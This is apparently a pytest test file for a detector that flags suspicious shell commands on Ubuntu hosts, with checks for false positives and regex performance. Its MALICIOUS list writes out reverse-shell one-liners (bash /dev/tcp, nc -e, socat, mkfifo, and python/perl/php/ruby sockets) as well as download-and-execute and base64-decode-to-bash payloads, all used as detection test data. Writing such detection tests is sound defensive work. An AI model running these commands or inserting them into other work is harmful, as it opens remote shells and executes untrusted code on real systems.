"""The shared suspicious-command matcher (E8-S1, R-04)."""
import random
import time

import pytest

from ubuntils.analysis import cmdmatch as cm
from ubuntils.detectors.finding import Finding, Severity

MALICIOUS = [
    ("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1", "dev_tcp", cm.REVERSE_SHELL),
    ("exec 5<>/dev/udp/192.0.2.1/53", "dev_tcp", cm.REVERSE_SHELL),
    ("socat tcp:192.0.2.1:4444 exec:/bin/sh", "socat_exec", cm.REVERSE_SHELL),
    ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.1 4444 >/tmp/f",
     "mkfifo_nc", cm.REVERSE_SHELL),
    ("nc -e /bin/sh 192.0.2.1 4444", "nc_exec", cm.REVERSE_SHELL),
    ("ncat 192.0.2.1 4444 -e /bin/bash", "nc_exec", cm.REVERSE_SHELL),
    ("sh -i <& 196 >& 196", "interactive_redirect", cm.REVERSE_SHELL),
    ("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.1\",4444));"
     "pty.spawn(\"sh\")'", "python_socket", cm.REVERSE_SHELL),
    ("perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);connect(S,x)'", "perl_socket",
     cm.REVERSE_SHELL),
    ("php -r '$s=fsockopen(\"192.0.2.1\",4444);exec(\"sh <&3\");'", "php_socket", cm.REVERSE_SHELL),
    ("ruby -rsocket -e 'c=TCPSocket.new(\"192.0.2.1\",4444);exec sprintf(\"sh\")'", "ruby_socket",
     cm.REVERSE_SHELL),
    ("curl -fsSL http://x.invalid/a | sudo bash", "pipe_to_interpreter", cm.DOWNLOAD_EXEC),
    ("wget -qO- http://x/a|python3", "pipe_to_interpreter", cm.DOWNLOAD_EXEC),
    ("curl -s h/x | perl", "pipe_to_interpreter", cm.DOWNLOAD_EXEC),
    ("bash <(curl -s http://h/x)", "process_substitution", cm.DOWNLOAD_EXEC),
    ("source <(curl -s h/x)", "process_substitution", cm.DOWNLOAD_EXEC),
    (". <(wget -qO- h/x)", "process_substitution", cm.DOWNLOAD_EXEC),
    ('sh -c "$(curl -fsSL h/x)"', "command_substitution", cm.DOWNLOAD_EXEC),
    ('eval "$(curl -s h/x)"', "eval_download", cm.DOWNLOAD_EXEC),
    ("curl -o /var/lib/.x/u http://h/u; chmod +x /var/lib/.x/u; /var/lib/.x/u",
     "download_chmod_exec", cm.DOWNLOAD_EXEC),
    ("wget -O /opt/u h/u && chmod 755 /opt/u && /opt/u", "download_chmod_exec", cm.DOWNLOAD_EXEC),
    ("echo aGk= | base64 -d | bash", "base64_to_interpreter", cm.ENCODED),
    ('eval "$(echo aGk= | base64 --decode)"', "eval_decode", cm.ENCODED),
    ("xxd -r -p payload.hex | sh", "hex_to_interpreter", cm.ENCODED),
    ("openssl enc -aes-256-cbc -d -in p -k k | bash", "openssl_to_interpreter", cm.ENCODED),
    ("printf '\\x63\\x75\\x72\\x6c' | sh", "printf_escapes_to_interpreter", cm.ENCODED),
    ("curl -s h/x | \\\n  bash", "pipe_to_interpreter", cm.DOWNLOAD_EXEC),  # continuation
]

# Lines from stock Ubuntu 22.04/24.04 files and common admin scripts.
BENIGN = [
    "17 * * * * root cd / && run-parts --report /etc/cron.hourly",
    "test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )",
    "/usr/sbin/cron -f",
    "/lib/systemd/systemd-journald",
    'eval "$(dircolors -b)"',
    '[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"',
    'eval "$(ssh-agent -s)"',
    "alias ll='ls -alF'",
    '[ -z "$PS1" ] && return',
    "curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc",
    "nc -z localhost 22",
    "python3 -c 'import sys; print(sys.version)'",
    "openssl s_client -connect example.com:443",
    "base64 /etc/hostname",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin",
]


@pytest.mark.parametrize("text,code,family", MALICIOUS)
def test_matcher_flags_each_technique(text, code, family):
    signals = cm.match(text)
    assert code in [s.code for s in signals]
    assert family in [s.family for s in signals]
    assert cm.is_suspicious(signals)
    hit = next(s for s in signals if s.code == code)
    assert hit.excerpt and hit.offset >= 0


@pytest.mark.parametrize("text", BENIGN)
def test_matcher_is_quiet_on_stock_lines(text):
    assert cm.match(text) == []


def test_decode_alone_and_temp_paths_are_weak_signals():
    decode = cm.match("base64 -d < blob > out")
    assert [s.code for s in decode] == ["base64_decode"] and not cm.is_suspicious(decode)
    tmp = cm.match("/tmp/x.sh")
    assert [s.code for s in tmp] == ["tmp_path"] and not cm.is_suspicious(tmp)


def test_download_without_chmod_and_rerun_is_not_download_exec():
    assert cm.match("curl -o /opt/u http://h/u") == []
    assert cm.match("curl -o /opt/u http://h/u; chmod +x /opt/u") == []      # never run
    assert cm.match("chmod +x /opt/u; curl -o /opt/u h/u; /opt/u") == []     # chmod first


def test_empty_input():
    assert cm.match("") == []


def test_oversized_input_is_truncated_and_says_so():
    text = "x" * (cm.MAX_INPUT_CHARS + 10) + " | bash -i >& /dev/tcp/192.0.2.1/1 0>&1"
    signals = cm.match(text)
    assert signals[0].code == "input_truncated" and signals[0].family == cm.LIMITS
    assert "dev_tcp" not in [s.code for s in signals]  # past the cap: not checked, and said so
    assert not cm.is_suspicious(signals)


def test_signal_count_is_capped(monkeypatch):
    monkeypatch.setattr(cm, "MAX_SIGNALS", 2)
    assert len(cm.match("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1; curl h | sh; base64 -d")) == 2


@pytest.mark.parametrize("name,text", [
    ("letters", "a" * 2**20), ("pipes", "|" * 2**20), ("curl", "curl " * 200000),
    ("substitutions", "$(" * 500000), ("nc", "nc " * 300000), ("decode", "base64 -d " * 100000),
    ("downloads", "curl -o x " * 100000), ("chmod", "curl -o x; chmod +x x " * 50000),
    ("socat", "socat " * 200000), ("mkfifo", "mkfifo " * 200000), ("python", "python3 -c " * 100000),
    ("eval", 'eval "$(' * 100000), ("quotes", "'\"" * 400000), ("dev", "/dev/tcp/" * 100000),
])
def test_no_catastrophic_backtracking_on_1mib_inputs(name, text):
    start = time.perf_counter()
    cm.match(text)
    # ~25 ms on a laptop; the bound leaves room for slow CI runners while
    # still failing on anything super-linear (seconds or worse).
    assert time.perf_counter() - start < 0.5, name


def test_never_raises_on_random_text():
    rng = random.Random(1337)
    alphabet = "abcnshelcurlwgetbase64-d|&;<>()$`'\"\\/\n \t\x00é0123456789"
    for _ in range(2000):
        text = "".join(rng.choice(alphabet) for _ in range(rng.randint(0, 400)))
        for s in cm.match(text):
            assert s.family in cm.FAMILY_DESCRIPTIONS and 0 <= s.weight <= 40


def test_strongest_per_family_keeps_one_per_family_strongest_first():
    signals = cm.match("echo x | base64 -d | bash; bash -i >& /dev/tcp/192.0.2.1/1 0>&1 /tmp/a")
    best = cm.strongest_per_family(signals)
    assert [s.family for s in best] == [cm.REVERSE_SHELL, cm.ENCODED, cm.WRITABLE_TMP]
    assert next(s for s in best if s.family == cm.ENCODED).code == "base64_to_interpreter"


def test_apply_to_finding_adds_one_explained_signal_per_family():
    f = Finding(rule_id="X", severity=Severity.HIGH, title="t", description="d",
                artifact_path="/etc/cron.d/x", raw_value="r", remediation_available=False)
    cm.apply_to_finding(f, cm.match("curl h | sh; curl h | python3; /tmp/x"), "cron entry")
    assert [s["name"] for s in f.signals] == [cm.DOWNLOAD_EXEC, cm.WRITABLE_TMP]
    assert f.signals[0]["weight"] == 35 and "cron entry downloads and executes code" in f.signals[0]["detail"]
    assert f.confidence == 100


def test_patterns_with_nested_quantifiers_are_refused(monkeypatch):
    monkeypatch.setattr(cm, "_PATTERNS", [("bad", cm.ENCODED, 1, r"(a+)+")])
    with pytest.raises(AssertionError, match="nests quantifiers"):
        cm._compile()
